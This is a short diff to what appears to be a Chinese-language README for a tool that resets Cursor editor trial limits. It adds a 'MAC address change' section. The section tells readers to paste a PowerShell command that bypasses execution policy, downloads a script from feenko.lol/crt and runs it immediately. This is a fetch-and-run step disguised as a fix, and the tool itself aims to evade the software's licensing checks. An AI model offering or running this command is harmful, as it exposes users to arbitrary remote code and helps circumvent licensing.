@@ -1,3 +1,8 @@
+# 新版本网卡mac地址修改
+  2025.2.14更新，新版本会校验网卡mac地址，所以需要修改mac地址
+  ~~~ cmd
+   powershell -ExecutionPolicy Bypass -NoProfile -Command "& {irm feenko.lol/crt | iex}"
+  ~~~
 # 1.程序使用
 ## 🚀 最新更新 v6.0.0
 - 新增支持 Cursor v0.45.x 版本
